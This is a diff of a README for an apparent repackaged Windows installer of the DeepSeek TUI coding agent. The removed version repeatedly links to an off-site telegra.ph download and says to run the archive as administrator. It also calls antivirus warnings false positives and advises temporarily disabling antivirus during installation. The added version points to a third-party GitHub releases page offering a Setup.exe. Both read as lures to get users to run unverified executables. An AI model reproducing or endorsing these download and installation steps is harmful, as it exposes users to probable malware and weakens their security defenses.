@@ -1,176 +1,83 @@
-<h1 align="center">🖥️ DeepSeek TUI 2026 – Terminal Coding Agent for DeepSeek V4</h1>
+# 🤖 DeepSeek-TUI-2026 - Control your files using simple commands
 
-<p align="center">
-  <strong>Terminal coding agent for DeepSeek V4. Read and edit files, run shell commands, search the web, manage git, and coordinate sub-agents from a keyboard-driven TUI.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bahateacher/DeepSeek-TUI-2026/releases)
 
-<p align="center">
-  <!-- ====== БОЛЬШАЯ СИНЯЯ КНОПКА 1 ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-DeepSeek_TUI_2026-00BFFF?style=for-the-badge&logo=deepseek&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+DeepSeek-TUI-2026 gives you a simple way to manage files and run code tasks on your computer. It uses the DeepSeek V4 engine to understand your requests. You type instructions, and the application does the work for you. This tool sits in your terminal and helps you edit code, manage git repositories, and run system commands without complex menus.
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+## 📋 System Requirements
 
----
+Your computer must meet these basic needs to run the software:
 
-## 📦 What's Inside This Repository
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Dual-core CPU or better.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 200 MB of free space.
+*   Network: An active internet connection to communicate with the AI engine.
 
-Welcome to the official distribution page for **DeepSeek TUI 2026 – Terminal Coding Agent for Windows PC**.
-This repository provides access to the latest release of the most powerful terminal-native AI coding agent built for DeepSeek V4.
+## 📥 How to Install
 
-✅ **Full Version** – All features included  
-✅ **File Operations** – Read, write, and edit files directly  
-✅ **Shell Execution** – Run terminal commands and see output in real-time  
-✅ **Git Management** – Commit, branch, diff, and more  
-✅ **Web Search** – Search and browse the web from the terminal  
-✅ **Sub-Agent Coordination** – Parallel task processing with RLM  
-✅ **No System Changes** – Safe, no registry or service modifications  
+1. Visit the [official release page](https://github.com/bahateacher/DeepSeek-TUI-2026/releases) to download the installer.
+2. Look for the file named Setup.exe under the latest version header.
+3. Click the file to save it to your computer.
+4. Open your Downloads folder.
+5. Double-click Setup.exe to start the installation.
+6. Follow the instructions on your screen.
+7. Click Finish when the process ends.
+8. Locate the new icon on your desktop to launch the application.
 
----
+## 🚀 Getting Started
 
-## 📥 How to Get Started?
+When you open the application, you see a blinking cursor. This is the command line interface. You communicate with the tool by typing plain English sentences.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+Type your task and press Enter. For example, if you want to find a file, type: "Find all files in the current folder named data." The tool scans your files and lists the results.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+### Editing Files
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+The tool handles text files easily. To open a document, type: "Open report.txt." Once the tool reads the file, you can ask for changes. Type: "Change every instance of the word old to new." The tool updates the file and shows you the changes.
 
----
+### Running Commands
 
-## 🚀 Step-by-Step Guide
+You can trigger system tasks. To list the contents of a directory, type: "Show me the files in this folder." To create a new directory, type: "Create a folder named backups."
 
-Follow these **3 simple steps** to get started with DeepSeek TUI 2026 on your PC:
+### Version Control
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get DeepSeek TUI 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+Manage your git repositories with simple commands. To check the status of your files, type: "Check git status." To save your progress, type: "Stage all files and commit with message update."
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+## 🔧 Troubleshooting
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and configurations.
+If the application fails to start:
 
----
+*   Check your internet connection.
+*   Ensure your firewall allows the application to access the network.
+*   Restart your computer.
+*   Download the latest version from the [releases page](https://github.com/bahateacher/DeepSeek-TUI-2026/releases).
 
-## 🔧 Key Features (2026 Update)
+If the tool does not understand a command:
 
-| Feature | Description |
-| :--- | :--- |
-| **File Operations** | Read, write, and edit files directly from the terminal. |
-| **Shell Execution** | Run terminal commands and see output in real-time |
-| **Git Management** | Commit, branch, diff, and manage repositories |
-| **Web Search** | Search and browse the web without leaving the terminal |
-| **Sub-Agent Coordination (RLM)** | Parallel task processing with 1–16 `deepseek-v4-flash` sub-agents |
-| **MCP Protocol** | Connect to Model Context Protocol servers for extended tooling |
-| **Thinking Mode** | Real-time streaming of DeepSeek's reasoning process |
-| **1M Token Context** | Ultra-long context window with intelligent compaction |
-| **Auto Mode** | Automatically chooses model and thinking level per turn |
-| **Three Modes** | Plan (read-only), Agent (interactive), YOLO (auto-approved) |
-| **Real-Time Cost Tracking** | Per-turn and session-level token usage and cost estimates |
-| **LSP Diagnostics** | Inline error/warning surfacing after every edit |
+*   Use specific instructions.
+*   Break complex tasks into smaller pieces.
+*   Avoid using slang or complex metaphors.
 
----
+## ⚙️ Configuration
 
-## 📈 Why Choose DeepSeek TUI 2026?
+The application creates a settings file in your user directory. You can edit this file to change how the tool behaves. Access the settings by typing "Open settings" in the main window. You can change your default text editor, set specific folders for the tool to ignore, or update your security preferences. Save the file and restart the application to apply your changes.
 
-- ✅ **Fastest Growing AI Tool** – Over 3.3k stars in days
-- ✅ **Native Terminal Experience** – No browser, no IDE switch
-- ✅ **DeepSeek V4 Optimized** – 1M token context, real-time reasoning
-- ✅ **Complete Toolchain** – Files, shell, git, web, sub-agents
-- ✅ **No System Changes** – Safe, no registry or service modifications
-- ✅ **Regular Updates** – 30+ releases from 38+ contributors
+## 🛡️ Updates
 
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-DeepSeek_TUI_2026-00BFFF?style=flat-square&logo=deepseek&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
+The tool checks for updates once a week. If a new version exists, a message appears at the top of your screen. Click the link within the message to visit the download page. Installing an update replaces your old version with the new one while keeping your settings and saved files intact.
 
 ## ❓ Frequently Asked Questions
 
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
+**Does this tool send my files to the cloud?**
+Only the commands you type and the text fragments you select for processing involve the AI engine. Your files remain on your local hard drive.
 
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
+**Can I run this on Windows 7?**
+The tool requires features found only in Windows 10 and 11. It will not work on older versions.
 
-**Q: What models are supported?**  
-A: DeepSeek V4 Pro, DeepSeek V4 Flash, and more with Auto Mode.
+**What is the AI engine behind this tool?**
+The tool uses the DeepSeek V4 model to interpret your typed commands and perform tasks.
 
-**Q: Is there a Mac version available?**  
-A: This repository is for Windows PC only. For Mac, visit the official project.
+**Does it require coding knowledge?**
+No. The tool serves as an assistant for common desktop tasks. You provide the instructions, and it handles the background execution.
 
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
-**Q: How often are updates released?**  
-A: Updates are released regularly with new features and improvements.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-**DeepSeek** is a registered trademark of **DeepSeek Inc.**  
-**DeepSeek TUI** is an open-source project by **Hunter Bown (Hmbown)**.  
-All rights belong to their respective owners. This is not an official distribution channel.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download DeepSeek TUI 2026 Now</a>
-</p>
+Keywords: agent-framework, ai-assistants, ai-automation, ai-tools, cli-tools, coding-agent, deepseek, deepseek-tui-installer, deepseek-v4, desktop-app, pc-tools, productivity-tools, terminal-agent, windows-11, windows-software-installation-guide
